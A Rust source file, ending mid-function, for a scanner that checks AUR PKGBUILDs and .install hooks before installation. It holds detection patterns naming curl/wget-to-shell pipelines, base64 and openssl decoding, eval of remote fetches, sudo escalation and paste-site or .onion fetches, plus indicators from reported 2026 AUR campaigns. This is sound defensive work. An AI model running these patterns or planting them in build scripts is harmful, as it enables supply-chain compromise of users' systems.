//! AUR PKGBUILD safety scanner.
//!
//! Runs automatically before every AUR install: fetches each package's raw
//! PKGBUILD from the AUR cgit mirror and greps for common red-flag patterns
//! seen in malicious/compromised PKGBUILDs. Not a substitute for reading it
//! yourself — just a cheap tripwire against obvious tricks. On any hit,
//! install is blocked until the user types an explicit "y".
//!
//! Covers two disclosed 2026 AUR supply-chain campaigns specifically (in
//! addition to the generic curl|sh/base64/chmod-777/raw-IP/paste-site
//! heuristics): "Atomic Arch" (June 11-12, adopted 400+ orphaned packages,
//! npm/bun-delivered infostealer) and the openconnect-sso-anchored wave
//! (late July-early August, at least 89 named packages, a `validator`
//! binary run via `sudo` mid-build, reused Tor-backed second-stage
//! delivery) — see `sudo_escalation_line`, `onion_address_line`, and
//! `KNOWN_MALICIOUS_SHA256` below.

use colored::Colorize;
use std::io::{self, Write};
use std::process::{Command, Stdio};

use crate::*;

// ── AUR PKGBUILD safety scanner ─────────────────────────────────────────────
//
// Runs automatically before every AUR install. Fetches each package's raw
// PKGBUILD from the AUR cgit mirror and greps for common red-flag patterns
// seen in malicious/compromised PKGBUILDs. Not a substitute for reading it
// yourself — just a cheap tripwire against obvious tricks.
//
// On any hit, install is blocked until the user types an explicit "y".

const CURL_BIN: &str = "/usr/bin/curl";

/// Download a raw file from a package's AUR git tree via cgit (e.g.
/// "PKGBUILD" or a referenced ".install" hook). Returns None on any
/// failure — callers should treat that as "nothing to check", not clean.
pub(crate) fn fetch_aur_file(pkg: &str, filename: &str) -> Option<String> {
    let url = format!(
        "https://aur.archlinux.org/cgit/aur.git/plain/{}?h={}",
        filename, pkg
    );
    let output = Command::new(CURL_BIN)
        .args(["-sfL", "--max-time", "10", &url])
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .output()
        .ok()?;
    if !output.status.success() {
        return None;
    }
    let text = String::from_utf8_lossy(&output.stdout).to_string();
    if text.trim().is_empty() {
        None
    } else {
        Some(text)
    }
}

pub(crate) fn fetch_aur_pkgbuild(pkg: &str) -> Option<String> {
    fetch_aur_file(pkg, "PKGBUILD")
}

/// Extract the `.install` hook filename from a PKGBUILD's `install=`
/// variable. Runs as root as part of the pacman transaction, so it's a
/// sensitive execution point (used in the June 2026 "Atomic Arch" campaign).
pub(crate) fn parse_install_filename(pkgbuild_text: &str) -> Option<String> {
    for line in pkgbuild_text.lines() {
        let l = line.trim();
        if l.starts_with('#') {
            continue;
        }
        if let Some(rest) = l.strip_prefix("install=") {
            let name = rest.trim().trim_matches('\'').trim_matches('"');
            if !name.is_empty() {
                return Some(name.to_string());
            }
        }
    }
    None
}

/// Same as `parse_install_filename`, but additionally resolves a
/// `$pkgname`/`${pkgname}` or `$pkgbase`/`${pkgbase}` reference against the
/// PKGBUILD's own declared value. Most real PKGBUILDs write
/// `install=${pkgname}.install` rather than repeating the literal name —
/// the plain literal parser returns that unresolved string, the fetch
/// against it 404s, and the install hook silently never gets scanned at
/// all. Returns `None` if the value still contains an unresolved `$` after
/// substitution (e.g. `pkgname` declared as an array in a split package)
/// rather than fetching a garbage filename.
pub(crate) fn resolve_install_filename(pkgbuild_text: &str) -> Option<String> {
    let raw = parse_install_filename(pkgbuild_text)?;
    if !raw.contains('$') {
        return Some(raw);
    }
    let pkgname = simple_var(pkgbuild_text, "pkgname");
    let pkgbase = simple_var(pkgbuild_text, "pkgbase");
    let resolved = raw
        .replace("${pkgname}", pkgname.as_deref().unwrap_or("\u{0}"))
        .replace("$pkgname", pkgname.as_deref().unwrap_or("\u{0}"))
        .replace("${pkgbase}", pkgbase.as_deref().unwrap_or("\u{0}"))
        .replace("$pkgbase", pkgbase.as_deref().unwrap_or("\u{0}"));
    if resolved.contains('$') || resolved.contains('\u{0}') {
        None
    } else {
        Some(resolved)
    }
}

/// Grabs a simple scalar `key=value` assignment from a PKGBUILD (first
/// match, comments skipped). Returns `None` for array assignments
/// (`pkgname=(a b)`, used by split packages) since there's no single
/// value to substitute.
fn simple_var(source: &str, key: &str) -> Option<String> {
    let needle = format!("{}=", key);
    for line in source.lines() {
        let l = line.trim();
        if l.starts_with('#') {
            continue;
        }
        if let Some(rest) = l.strip_prefix(&needle) {
            if rest.starts_with('(') {
                return None;
            }
            let v = rest.trim().trim_matches('\'').trim_matches('"');
            if !v.is_empty() {
                return Some(v.to_string());
            }
        }
    }
    None
}

/// `curl ... | sh` / `wget ... | bash` / `... | source` style remote-code-exec
/// pipelines. Deliberately loose (matches curl/wget followed eventually by a
/// pipe into a shell) since attackers vary whitespace and flags constantly.
pub(crate) fn curl_pipe_shell_line(line: &str) -> bool {
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    let lower = l.to_lowercase();
    let has_fetcher = lower.contains("curl ") || lower.contains("curl\t")
        || lower.contains("wget ") || lower.contains("wget\t");
    if !has_fetcher || !lower.contains('|') {
        return false;
    }
    let after_pipe = lower.splitn(2, '|').nth(1).unwrap_or("").trim();
    let mut tokens = after_pipe.split_whitespace();
    let mut first = tokens.next().unwrap_or("");
    // `env sh` / `env -S bash` wrapper — skip past `env` and its flags to
    // the actual interpreter token.
    if first == "env" {
        first = tokens.find(|t: &&str| !t.starts_with('-')).unwrap_or("");
    }
    // Strip a path prefix so `/bin/sh`, `/usr/bin/bash`, `./sh` etc. match
    // the same as a bare shell name — the old exact-match here let
    // absolute-path shells slip straight through.
    let basename = first.rsplit('/').next().unwrap_or(first);
    ["sh", "bash", "zsh", "source", "."].contains(&basename)
}

#[cfg(test)]
pub(crate) fn is_curl_pipe_shell(source: &str) -> bool {
    source.lines().any(curl_pipe_shell_line)
}

/// Same check as `is_curl_pipe_shell`, but returns the 1-indexed line
/// number of the first match instead of a bare bool, so alert output can
/// point at the exact offending line.
pub(crate) fn line_of_curl_pipe_shell(source: &str) -> Option<usize> {
    source.lines().position(curl_pipe_shell_line).map(|i| i + 1)
}

/// `base64 -d` / `base64 --decode` — near-universal marker of obfuscated
/// payloads stashed in a PKGBUILD (legit PKGBUILDs essentially never need
/// this).
pub(crate) fn base64_decode_line(line: &str) -> bool {
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    let lower = l.to_lowercase();
    lower.contains("base64 -d") || lower.contains("base64 --decode")
        || lower.contains("base64 -D")
}

#[cfg(test)]
pub(crate) fn is_base64_decode(source: &str) -> bool {
    source.lines().any(base64_decode_line)
}

pub(crate) fn line_of_base64_decode(source: &str) -> Option<usize> {
    source.lines().position(base64_decode_line).map(|i| i + 1)
}

/// `chmod 777` / `chmod -R 777` (and equivalent a+rwx) — overly permissive
/// perms with no legitimate reason to appear in a build script.
pub(crate) fn chmod_777_line(line: &str) -> bool {
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    let lower = l.to_lowercase();
    lower.contains("chmod") && (lower.contains("777") || lower.contains("a+rwx"))
}

#[cfg(test)]
pub(crate) fn is_chmod_777(source: &str) -> bool {
    source.lines().any(chmod_777_line)
}

pub(crate) fn line_of_chmod_777(source: &str) -> Option<usize> {
    source.lines().position(chmod_777_line).map(|i| i + 1)
}

/// A bare dotted-quad IPv4 literal anywhere in the file — legit PKGBUILDs
/// fetch from named domains, not hardcoded IPs. Heuristic: 4 dot-separated
/// 1-3 digit groups <= 255, not adjacent to other digits/dots.
///
/// Known false positive: a 4-component version string like "1.2.3.4" is
/// indistinguishable from an IP here. Acceptable since this only prompts
/// a review, not a hard failure.
pub(crate) fn line_has_raw_ipv4(source: &str) -> bool {
    let bytes = source.as_bytes();
    let is_boundary = |c: Option<u8>| !matches!(c, Some(b) if b.is_ascii_digit() || b == b'.');

    let chars: Vec<char> = source.chars().collect();
    let n = chars.len();
    let mut i = 0;
    while i < n {
        if chars[i].is_ascii_digit() {
            let start = i;
            let mut j = i;
            let mut octets = 0;
            let mut ok = true;
            loop {
                let mut k = j;
                while k < n && chars[k].is_ascii_digit() && k - j < 3 {
                    k += 1;
                }
                if k == j {
                    ok = false;
                    break;
                }
                let octet: u32 = chars[j..k].iter().collect::<String>().parse().unwrap_or(999);
                if octet > 255 {
                    ok = false;
                    break;
                }
                octets += 1;
                j = k;
                if octets == 4 {
                    break;
                }
                if j < n && chars[j] == '.' {
                    j += 1;
                } else {
                    ok = false;
                    break;
                }
            }
            if ok && octets == 4 {
                let before_ok = is_boundary(bytes.get(start.wrapping_sub(1)).copied().filter(|_| start > 0));
                let after_ok = is_boundary(chars.get(j).map(|c| *c as u8));
                let before_ok = start == 0 || before_ok;
                if before_ok && after_ok {
                    return true;
                }
            }
            i = start + 1;
        } else {
            i += 1;
        }
    }
    false
}

#[cfg(test)]
pub(crate) fn contains_raw_ipv4(source: &str) -> bool {
    source.lines().any(line_has_raw_ipv4)
}

pub(crate) fn line_of_raw_ipv4(source: &str) -> Option<usize> {
    source.lines().position(line_has_raw_ipv4).map(|i| i + 1)
}

/// A run of `\xHH` hex-escape sequences long enough to be an encoded
/// payload (e.g. shellcode) fed to `printf`/`echo -e`. Keyed on `\x`
/// escapes specifically, not bare hex, since bare hex is common in
/// legit PKGBUILDs (checksums, PGP fingerprints, commit hashes).
pub(crate) fn hex_escape_payload_line(line: &str) -> bool {
    const THRESHOLD: usize = 8; // consecutive \xHH escapes in one line
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    let bytes = l.as_bytes();
    let mut i = 0;
    let mut run = 0usize;
    while i < bytes.len() {
        if bytes[i] == b'\\' && i + 3 < bytes.len() && (bytes[i + 1] == b'x' || bytes[i + 1] == b'X')
            && bytes[i + 2].is_ascii_hexdigit() && bytes[i + 3].is_ascii_hexdigit()
        {
            run += 1;
            if run >= THRESHOLD {
                return true;
            }
            i += 4;
        } else {
            run = 0;
            i += 1;
        }
    }
    false
}

#[cfg(test)]
pub(crate) fn is_hex_escape_payload(source: &str) -> bool {
    source.lines().any(hex_escape_payload_line)
}

pub(crate) fn line_of_hex_escape_payload(source: &str) -> Option<usize> {
    source.lines().position(hex_escape_payload_line).map(|i| i + 1)
}

/// A download/fetch aimed at a paste-dump site rather than a proper
/// release/source host. Legitimate PKGBUILDs essentially never pull build
/// inputs from a paste site; historically this is exactly how the 2018
/// acroread/balz/minergate AUR takeover staged its payload — a `curl`
/// straight to a Pastebin raw URL, piped into the persistence script.
/// Distinct from the generic curl-pipe-shell check: this fires even when
/// the fetched content isn't piped directly into a shell on the same line
/// (e.g. saved to a file and `source`d or `exec`'d later).
pub(crate) fn paste_site_fetch_line(line: &str) -> bool {
    const HOSTS: &[&str] = &[
        "pastebin.com/raw", "hastebin.com/raw", "hastebin.com/share",
        "dpaste.com", "dpaste.org", "ix.io", "0x0.st", "transfer.sh",
        "paste.ee", "termbin.com",
    ];
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    let lower = l.to_lowercase();
    if !(lower.contains("curl") || lower.contains("wget")) {
        return false;
    }
    HOSTS.iter().any(|h| lower.contains(h))
}

#[cfg(test)]
pub(crate) fn is_paste_site_fetch(source: &str) -> bool {
    source.lines().any(paste_site_fetch_line)
}

pub(crate) fn line_of_paste_site_fetch(source: &str) -> Option<usize> {
    source.lines().position(paste_site_fetch_line).map(|i| i + 1)
}

/// Exact filesystem artifact from the 2018 acroread/balz/minergate AUR
/// takeover: the injected script dropped a literal `compromised.txt`
/// marker file into `/` and every home directory. A PKGBUILD/.install
/// hook referencing that exact filename has no legitimate reason to.
pub(crate) fn compromised_marker_line(line: &str) -> bool {
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    l.contains("compromised.txt")
}

#[cfg(test)]
pub(crate) fn has_compromised_marker(source: &str) -> bool {
    source.lines().any(compromised_marker_line)
}

pub(crate) fn line_of_compromised_marker(source: &str) -> Option<usize> {
    source.lines().position(compromised_marker_line).map(|i| i + 1)
}

/// Exact indicators from known, still-circulating AUR supply-chain
/// campaigns. Will go stale as campaigns rotate names, but it's a
/// zero-cost, high-confidence check when it does fire.
///
/// Background: the "Atomic Arch" campaign (disclosed June 11-12, 2026)
/// adopted 400+ orphaned AUR packages and edited PKGBUILD/`.install`
/// hooks to pull in an infostealer via npm/bun during the build.
///
/// A second, distinct wave hit the AUR in late July/early August 2026,
/// anchored by a compromised `openconnect-sso` package (report: 30 Jul
/// 2026) and at least 89 other publicly-corroborated package names —
/// Arch disabled AUR package adoption and then all pushes while handling
/// it. That wave's reported mechanism (a binary named `validator` run via
/// `sudo` mid-build) is covered by `sudo_escalation_line` above rather
/// than by name here, since the payload binary name isn't itself a
/// package name to match against.
const KNOWN_MALICIOUS_PACKAGE_NAMES: &[&str] = &["atomic-lockfile", "js-digest", "lockfile-js"];

/// Published sha256 hashes of stage-1/stage-2 payloads from the Jul/Aug
/// 2026 openconnect-sso-anchored wave (reused tradecraft from the June
/// 2026 Atomic Arch campaign). A PKGBUILD's `sha256sums=()` matching one
/// of these exactly means the source it's pinning to is the known-bad
/// payload, not just "looks suspicious".
const KNOWN_MALICIOUS_SHA256: &[&str] = &[
    "e73a35b3e75e94746428d1a207703d6335933deadee7d1d9c9d0328df7b9df77",
    "2d25d2ea313767fae5808164224cf6ad610ab09546d1e5a6f033eedbfd98a281",
    "06c857c8ca798d50c765b4de39e6c4f272ecb57bc8316a8ed4c0fdf02fb59502",
];

#[cfg(test)]
pub(crate) fn contains_known_malicious_hash(source: &str) -> Option<&'static str> {
    KNOWN_MALICIOUS_SHA256.iter().copied().find(|h| source.contains(h))
}

/// Same check, but returns the 1-indexed line number of the first match
/// alongside the matched hash, so alert output can point at the exact line.
pub(crate) fn line_of_known_malicious_hash(source: &str) -> Option<(usize, &'static str)> {
    for (i, line) in source.lines().enumerate() {
        if let Some(h) = KNOWN_MALICIOUS_SHA256.iter().copied().find(|h| line.contains(h)) {
            return Some((i + 1, h));
        }
    }
    None
}

#[cfg(test)]
pub(crate) fn contains_known_malicious_package(source: &str) -> Option<&'static str> {
    KNOWN_MALICIOUS_PACKAGE_NAMES.iter().copied().find(|name| source.contains(name))
}

/// Same check, but returns the 1-indexed line number of the first match
/// alongside the matched name, so alert output can point at the exact line.
pub(crate) fn line_of_known_malicious_package(source: &str) -> Option<(usize, &'static str)> {
    for (i, line) in source.lines().enumerate() {
        if let Some(name) = KNOWN_MALICIOUS_PACKAGE_NAMES.iter().copied().find(|n| line.contains(n)) {
            return Some((i + 1, name));
        }
    }
    None
}

/// `npm install <pkg>` / `bun add <pkg>` / `pip install <pkg>` etc. naming
/// a specific external package — as opposed to a bare `npm ci`, which just
/// installs a project's own declared deps and is common/legitimate. Pulling
/// a named package mid-build is exactly the Atomic Arch mechanism. Known
/// false positive: legit installs of a global CLI tool this way also flag —
/// acceptable since it only costs a review prompt, never a hard block.
pub(crate) fn foreign_pkg_manager_install_line(line: &str) -> bool {
    const PATTERNS: &[&str] = &[
        "npm install ", "npm i ", "bun install ", "bun add ",
        "yarn add ", "pip install ", "pip3 install ", "gem install ",
    ];
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    let lower = l.to_lowercase();
    for p in PATTERNS {
        if let Some(idx) = lower.find(p) {
            let rest = &l[idx + p.len()..];
            let first_pkg_tok = rest.split_whitespace().find(|t| !t.starts_with('-'));
            if let Some(tok) = first_pkg_tok {
                if !tok.starts_with('.') && !tok.starts_with('/') {
                    return true;
                }
            }
        }
    }
    false
}

#[cfg(test)]
pub(crate) fn is_foreign_pkg_manager_install(source: &str) -> bool {
    source.lines().any(foreign_pkg_manager_install_line)
}

pub(crate) fn line_of_foreign_pkg_manager_install(source: &str) -> Option<usize> {
    source.lines().position(foreign_pkg_manager_install_line).map(|i| i + 1)
}

/// `sudo`/`pkexec`/`doas` invoked from inside a PKGBUILD/.install script.
/// `makepkg` deliberately builds as an unprivileged user so a malicious
/// `build()`/`package()` can't touch the system directly — a script that
/// escalates privileges itself is a structural red flag, not just a crude
/// pattern. This is exactly the mechanism reported in the late-July/early-
/// August 2026 AUR wave anchored by the compromised `openconnect-sso`
/// package: the malicious update added a binary named `validator` and ran
/// it via `sudo` during packaging, crossing from build-time execution into
/// privileged execution.
pub(crate) fn sudo_escalation_line(line: &str) -> bool {
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    let lower = l.to_lowercase();
    ["sudo ", "sudo\t", "pkexec ", "doas "].iter().any(|p| lower.contains(p))
}

#[cfg(test)]
pub(crate) fn is_sudo_escalation(source: &str) -> bool {
    source.lines().any(sudo_escalation_line)
}

pub(crate) fn line_of_sudo_escalation(source: &str) -> Option<usize> {
    source.lines().position(sudo_escalation_line).map(|i| i + 1)
}

/// A `.onion` address referenced directly in a PKGBUILD/.install script.
/// Legitimate PKGBUILDs essentially never hardcode a Tor hidden-service
/// address; the June 2026 Atomic Arch campaign's second-stage delivery was
/// Tor-backed, and the same onion infrastructure was reused in the late-
/// July/early-August 2026 wave.
pub(crate) fn onion_address_line(line: &str) -> bool {
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    l.to_lowercase().contains(".onion")
}

#[cfg(test)]
pub(crate) fn is_onion_address(source: &str) -> bool {
    source.lines().any(onion_address_line)
}

pub(crate) fn line_of_onion_address(source: &str) -> Option<usize> {
    source.lines().position(onion_address_line).map(|i| i + 1)
}

/// `eval "$(curl ...)"` / `eval `wget -O- ...`` — a stealthier cousin of
/// curl|sh: there's no literal pipe-into-shell to grep for, `eval` just
/// runs the fetched text as shell code directly via command substitution.
/// Deliberately scoped to `eval` paired with curl/wget inside a `$(...)`
/// or backtick construct on the same line — bare `eval` alone is common
/// and legitimate in PKGBUILDs (e.g. evaluating an array variable).
pub(crate) fn eval_remote_exec_line(line: &str) -> bool {
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    let lower = l.to_lowercase();
    let Some(idx) = lower.find("eval") else { return false };
    let after = &lower[idx..];
    let has_subshell = after.contains("$(") || after.contains('`');
    has_subshell && (after.contains("curl") || after.contains("wget"))
}

#[cfg(test)]
pub(crate) fn is_eval_remote_exec(source: &str) -> bool {
    source.lines().any(eval_remote_exec_line)
}

pub(crate) fn line_of_eval_remote_exec(source: &str) -> Option<usize> {
    source.lines().position(eval_remote_exec_line).map(|i| i + 1)
}

/// `python(3) -c '...'` where the inline snippet itself execs/evals
/// decoded content (`exec(`, `eval(`, `os.system(`, `subprocess.*`,
/// `os.popen(`) — a python-flavored equivalent of `base64 -d | bash`,
/// dressed up as "just calling python" to dodge the shell-specific
/// heuristics above.
pub(crate) fn python_inline_exec_line(line: &str) -> bool {
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    let lower = l.to_lowercase();
    let has_python_c = (lower.contains("python ") || lower.contains("python3 ") || lower.contains("python2 "))
        && lower.contains(" -c");
    if !has_python_c {
        return false;
    }
    ["exec(", "eval(", "os.system(", "subprocess.", "os.popen("]
        .iter()
        .any(|p| lower.contains(p))
}

#[cfg(test)]
pub(crate) fn is_python_inline_exec(source: &str) -> bool {
    source.lines().any(python_inline_exec_line)
}

pub(crate) fn line_of_python_inline_exec(source: &str) -> Option<usize> {
    source.lines().position(python_inline_exec_line).map(|i| i + 1)
}

/// `openssl enc -d` / `openssl ... -aes... -d` — decrypting a bundled blob
/// at build time. Same obfuscation role as `base64 -d`, one step more
/// effortful since it needs a key/passphrase baked in alongside it.
pub(crate) fn openssl_decrypt_line(line: &str) -> bool {
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    let lower = l.to_lowercase();
    lower.contains("openssl")
        && lower.contains(" -d")
        && (lower.contains("enc") || lower.contains("aes") || lower.contains("des") || lower.contains("cipher"))
}

#[cfg(test)]
pub(crate) fn is_openssl_decrypt(source: &str) -> bool {
    source.lines().any(openssl_decrypt_line)
}

pub(crate) fn line_of_openssl_decrypt(source: &str) -> Option<usize> {
    source.lines().position(openssl_decrypt_line).map(|i| i + 1)
}

/// How confident a finding is. `Suspicious` covers generic, crude-but-common
/// heuristics (curl|sh, base64 -d, chmod 777, raw IP, hex-escape payload) —
/// each a real reason to look twice but each with plausible false positives.
/// `ConfirmedIoc` is reserved for an exact-match indicator of compromise
/// against a specific, disclosed AUR supply-chain campaign (e.g. Atomic
/// Arch/June 2026, or the 2018 acroread/balz/minergate takeover), with
/// essentially no false-positive risk, so it gets a louder alert. The
/// specific campaign is always named in the finding's own message.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub(crate) enum Severity {
    Suspicious,
    ConfirmedIoc,
}

#[derive(Clone, Debug)]
pub(crate) struct Finding {
    /// 1-indexed line number the pattern matched on; 0 if not line-specific.
    line: usize,
    message: String,
    severity: Severity,
}

/// Run all heuristics against one PKGBUILD (or `.install` hook — same
/// shell-script surface, same heuristics apply), returning line-numbered,
/// severity-tagged findings (empty vec = clean).
pub(crate) fn scan_pkgbuild_source(source: &str) -> Vec<Finding> {
    let mut findings = Vec::new();
    if let Some(line) = crate::bash_ast::curl_pipe_shell(source).or_else(|| line_of_curl_pipe_shell(source)) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "downloads and pipes a remote script straight into a shell (curl/wget | sh)".to_string(),
        });
    }
    if let Some(line) = line_of_base64_decode(source) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "decodes a base64 blob (possible obfuscated payload)".to_string(),
        });
    }
    if let Some(line) = line_of_chmod_777(source) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "sets world-writable/executable permissions (chmod 777)".to_string(),
        });
    }
    if let Some(line) = line_of_raw_ipv4(source) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "fetches from or references a hardcoded raw IP address instead of a domain".to_string(),
        });
    }
    if let Some(line) = line_of_hex_escape_payload(source) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "contains a long run of \\xHH hex-escape sequences (possible encoded/obfuscated payload)".to_string(),
        });
    }
    if let Some(line) = line_of_paste_site_fetch(source) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "fetches from a paste-dump site (pastebin/hastebin/dpaste/ix.io/...) — the delivery mechanism used by the 2018 acroread/balz/minergate AUR takeover".to_string(),
        });
    }
    if let Some(line) = line_of_compromised_marker(source) {
        findings.push(Finding {
            line,
            severity: Severity::ConfirmedIoc,
            message: "references 'compromised.txt' — the exact marker file dropped by the 2018 acroread/balz/minergate AUR takeover".to_string(),
        });
    }
    if let Some((line, name)) = line_of_known_malicious_package(source) {
        findings.push(Finding {
            line,
            severity: Severity::ConfirmedIoc,
            message: format!(
                "references '{}' — a known-malicious package name from a documented AUR supply-chain campaign (Atomic Arch, June 2026)",
                name
            ),
        });
    }
    if let Some((line, hash)) = line_of_known_malicious_hash(source) {
        findings.push(Finding {
            line,
            severity: Severity::ConfirmedIoc,
            message: format!(
                "sha256 '{}' matches a published payload hash from the openconnect-sso-anchored AUR wave (Jul/Aug 2026)",
                hash
            ),
        });
    }
    if let Some(line) = line_of_foreign_pkg_manager_install(source) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "installs a named external package via npm/bun/yarn/pip/gem mid-build — the mechanism the Atomic Arch AUR campaign used to smuggle in its payload".to_string(),
        });
    }
    if let Some(line) = crate::bash_ast::sudo_escalation(source).or_else(|| line_of_sudo_escalation(source)) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "invokes sudo/pkexec/doas from inside the build script — makepkg builds unprivileged on purpose, so this escalates privilege mid-build; the exact mechanism reported in the openconnect-sso-anchored AUR wave (Jul/Aug 2026)".to_string(),
        });
    }
    if let Some(line) = line_of_onion_address(source) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "references a .onion address — legitimate PKGBUILDs don't hardcode Tor hidden-service addresses; matches the Tor-backed second-stage delivery reused across the June 2026 and Jul/Aug 2026 AUR campaigns".to_string(),
        });
    }
    if let Some(line) = crate::bash_ast::eval_remote_exec(source).or_else(|| line_of_eval_remote_exec(source)) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "runs `eval` on a curl/wget command substitution — executes fetched remote content without a literal pipe-into-shell to grep for".to_string(),
        });
    }
    if let Some(line) = crate::bash_ast::python_inline_exec(source).or_else(|| line_of_python_inline_exec(source)) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "python -c snippet execs/evals content inline — a python-flavored obfuscated-execution pattern".to_string(),
        });
    }
    if let Some(line) = line_of_openssl_decrypt(source) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "decrypts a bundled blob with openssl (possible obfuscated payload, same role as base64 -d)".to_string(),
        });
    }
    findings
}

/// Fetch + scan the PKGBUILD (and any referenced `.install` hook) for
/// every package about to be installed from the AUR. On any finding,
/// print it and require an explicit "y" to continue; anything else aborts.
///
/// Files that couldn't be fetched are silently skipped, not treated as a
/// hit — this only adds friction on actual findings, never on lookup failures.
///
/// Returns what was actually fetched per pkgbase (only for entries where
/// the PKGBUILD fetch succeeded), so a caller that's about to build from
/// a fresh `git clone` of the same pkgbase can diff the clone against
/// what was scanned here instead of re-fetching and re-scanning
/// unconditionally -- see `verify_local_clone_or_rescan`.
pub(crate) fn scan_aur_pkgbuilds_or_abort(pkgs: &[String]) -> std::collections::HashMap<String, FetchedSource> {
    let mut any_findings = false;
    let mut fetched: std::collections::HashMap<String, FetchedSource> = std::collections::HashMap::new();
    println!("{} Scanning AUR PKGBUILDs and .install hooks for suspicious patterns...", ">>>".green().bold());

    for pkg in pkgs {
        let pkgbuild_src = match fetch_aur_pkgbuild(pkg) {
            Some(s) => s,
            None => continue,
        };

        let install = resolve_install_filename(&pkgbuild_src)
            .and_then(|name| fetch_aur_file(pkg, &name).map(|src| (name, src)));

        // (file label, Finding) pairs across both PKGBUILD and, if present,
        // the referenced .install hook.
        let mut pkg_findings: Vec<(String, Finding)> = scan_pkgbuild_source(&pkgbuild_src)
            .into_iter()
            .map(|f| ("PKGBUILD".to_string(), f))
            .collect();

        if let Some((install_name, install_src)) = &install {
            pkg_findings.extend(
                scan_pkgbuild_source(install_src)
                    .into_iter()
                    .map(|f| (install_name.clone(), f)),
            );
        }

        fetched.insert(pkg.clone(), FetchedSource { pkgbuild: pkgbuild_src, install });

        if pkg_findings.is_empty() {
            continue;
        }
        any_findings = true;

        let atomic: Vec<&(String, Finding)> = pkg_findings.iter()
            .filter(|(_, f)| f.severity == Severity::ConfirmedIoc)
            .collect();
        let suspicious: Vec<&(String, Finding)> = pkg_findings.iter()
            .filter(|(_, f)| f.severity == Severity::Suspicious)
            .collect();

        // Highest-confidence alert first: a confirmed IOC match against a
        // disclosed campaign is more actionable than a generic heuristic.
        // The specific campaign is named in each finding's own message.
        if !atomic.is_empty() {
            print_finding_block(pkg, "Alert, matched a known-malicious IOC", &atomic, true, SourceOrigin::Cgit);
        }
        if !suspicious.is_empty() {
            print_finding_block(pkg, "Warning, detected suspicious fragment", &suspicious, false, SourceOrigin::Cgit);
        }
    }

    if !any_findings {
        return fetched;
    }

    eprintln!();
    eprintln!(
        "{} One or more AUR packages have PKGBUILD/.install content matching \
        known-suspicious patterns. Review them yourself before proceeding:",
        ">>>".red().bold()
    );
    for pkg in pkgs {
        eprintln!("    https://aur.archlinux.org/cgit/aur.git/tree/PKGBUILD?h={}", pkg);
    }
    eprint!("{} Continue anyway? [y/N] ", ">>>".yellow().bold());
    io::stderr().flush().ok();

    let answer = read_line_raw();
    let confirmed = answer.trim().eq_ignore_ascii_case("y");

    if !confirmed {
        eprintln!("{} Aborted.", ">>>".red().bold());
        std::process::exit(1);
    }

    fetched
}

/// A package's PKGBUILD (and, if referenced, `.install` hook) text as
/// fetched from cgit during `scan_aur_pkgbuilds_or_abort`.
pub(crate) struct FetchedSource {
    pub pkgbuild: String,
    pub install: Option<(String, String)>,
}

/// Re-checks the *actual* git checkout that's about to be built against
/// whatever was already scanned in `scan_aur_pkgbuilds_or_abort`.
///
/// The cgit scan and the `git clone` are two separate fetches of what's
/// supposed to be the same content -- normally identical, but nothing
/// guarantees that: a maintainer (or a hijacked account) can push a
/// change to the AUR repo in the window between them, and cgit's cache
/// can lag behind the git remote too. Comparing byte-for-byte against
/// what `prefetched` holds (when available) means the common case costs
/// nothing extra, while an actual mismatch gets the exact same
/// finding/prompt treatment as the pre-clone scan -- just against the
/// clone that will really be built, with a note that it differs from
/// what was already reviewed.
///
/// `prefetched: None` (fetch failed earlier, or this pkgbase was never
/// pre-scanned at all, e.g. resolved via a split-package alias) always
/// forces a full local scan rather than assuming "no finding" by default.
pub(crate) fn verify_local_clone_or_rescan(pkgbase: &str, dir: &std::path::Path, prefetched: Option<&FetchedSource>) {
    let Ok(local_pkgbuild) = std::fs::read_to_string(dir.join("PKGBUILD")) else {
        // Can't read what was just cloned -- the build step right after
        // this will fail loudly on the same thing, nothing useful to add.
        return;
    };
    let local_install = resolve_install_filename(&local_pkgbuild)
        .and_then(|name| std::fs::read_to_string(dir.join(&name)).ok().map(|src| (name, src)));

    if let Some(pre) = prefetched {
        let install_matches = match (&local_install, &pre.install) {
            (None, None) => true,
            (Some((ln, ls)), Some((pn, ps))) => ln == pn && ls == ps,
            _ => false,
        };
        if local_pkgbuild == pre.pkgbuild && install_matches {
            return; // identical to what was already scanned -- nothing to redo
        }
        println!(
            "{} '{}' clone differs from the copy already scanned via cgit -- verifying the clone directly...",
            ">>>".yellow().bold(),
            pkgbase
        );
    } else {
        println!(
            "{} '{}' wasn't scanned before cloning (cgit fetch failed or this pkgbase was only resolved after cloning) -- scanning the clone directly...",
            ">>>".yellow().bold(),
            pkgbase
        );
    }

    let mut pkg_findings: Vec<(String, Finding)> = scan_pkgbuild_source(&local_pkgbuild)
        .into_iter()
        .map(|f| ("PKGBUILD".to_string(), f))
        .collect();
    if let Some((name, src)) = &local_install {
        pkg_findings.extend(scan_pkgbuild_source(src).into_iter().map(|f| (name.clone(), f)));
    }

    if pkg_findings.is_empty() {
        return;
    }

